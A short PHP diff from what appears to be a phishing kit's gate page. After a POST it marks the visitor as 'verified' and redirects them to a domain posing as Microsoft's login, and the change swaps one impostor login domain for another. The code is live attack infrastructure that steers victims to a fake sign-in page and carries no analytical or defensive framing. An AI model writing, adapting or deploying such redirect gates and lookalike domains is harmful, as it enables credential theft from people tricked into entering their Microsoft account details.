@@ -5,7 +5,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $_SESSION['verified'] = true;
 
     // Change this to your original website
-    header('Location: https://login.microsoftonlineaccount.live.itologyinventor.com/');
+    header('Location: https://login-microsoftonlineaccountlive-com.onrender.com/');
     exit;
 }
 ?>
